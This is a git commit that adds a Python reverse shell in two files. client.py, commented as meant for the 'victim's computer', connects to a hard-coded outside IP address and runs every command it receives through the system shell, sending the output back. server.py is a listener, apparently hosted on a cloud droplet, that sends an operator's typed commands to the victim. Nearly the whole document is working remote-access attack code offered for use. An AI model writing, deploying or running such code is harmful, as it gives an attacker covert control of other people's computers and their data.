dd61e269a3b291344e8d0e60da6c1f342777ec59
Yashwant Soni <yashodint@gmail.com>
2023-04-24 16:53:57 +0530

    Added initital files

---
+++ client.py
@@ -0,0 +1,31 @@
+#This file will go to victim's computer
+import socket
+import os
+import subprocess
+
+s = socket.socket()
+host = '64.227.172.12'
+port = 6969
+
+s.connect((host, port))
+
+while True:
+    data = s.recv(1024)
+    if data[:2].decode('utf-8') == 'cd':
+        os.chdir(data[3:].decode('utf-8'))
+    
+    if len(data) > 0:
+        cmd = subprocess.Popen(
+            data.decode('utf-8'),
+            shell=True,
+            stdout=subprocess.PIPE,
+            stdin=subprocess.PIPE,
+            stderr=subprocess.PIPE
+        )
+
+        output_byte = cmd.stdout.read() + cmd.stderr.read()
+        output_str = str(output_byte, 'utf-8')
+        currentWD = os.getcwd() + '> '
+        s.send((output_str + currentWD).encode())
+        
+        print(output_str)
---
+++ server.py
@@ -0,0 +1,58 @@
+#this file will go to server (Our created droplet on DigitalOcean)
+import socket
+import sys
+
+def create_socket():
+    try:
+        global host
+        global port 
+        global s
+        
+        #Here host = "" means it will automatically get its own ip
+        host = ""
+        port = 9999
+        s = socket.socket()
+
+    except socket.error as msg:
+        print("Socket connection error : " + msg)
+
+def bind_socket():
+    try:
+        global host
+        global port 
+        global s
+
+        print("Binding the port " + str(port))
+
+        s.bind((host, port))
+        s.listen(5)
+    
+    except socket.error as msg:
+        print("Socket bindind error " + msg)
+        bind_socket()
+
+def socket_accept():
+    conn, address = s.accept()
+    print("Connection has established | IP " + address[0] + "| PORT " + str(address[1]))
+    send_commands(conn)
+    conn.close()
+
+def send_commands(conn):
+    while True:
+        cmd = input()
+        if cmd == 'quit':
+            conn.close()
+            s.close()
+            sys.exit()
+        if len(str.encode(cmd)) > 0:
+            conn.send(str.encode(cmd))
+            client_response = str(conn.recv(1024), 'utf-8')
+            print(client_response, end='')
+        
+
+def main():
+    create_socket()
+    bind_socket()
+    socket_accept()
+
+main()
